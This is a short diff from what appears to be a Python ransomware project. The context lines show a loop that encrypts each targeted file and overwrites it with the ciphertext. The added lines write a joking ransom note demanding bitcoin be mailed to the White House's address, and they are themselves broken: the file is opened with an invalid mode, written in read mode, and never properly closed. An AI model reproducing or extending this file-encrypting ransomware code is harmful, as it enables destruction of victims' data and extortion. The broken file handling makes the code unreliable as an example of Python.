@@ -61,3 +61,9 @@ for file in targets:
 	encrypt_data = skey.encrypt(file_data)
 	with open(file, "wb") as target:
 		target.write(encrypt_data)
+
+		
+# Create Ransom note
+Ransom = open("Ransom.txt", "R")
+Ransom.write("Please mail a bitcoin to 1600 Pennsylvania Avenue NW, Washington, DC 20500")
+Ransom.close
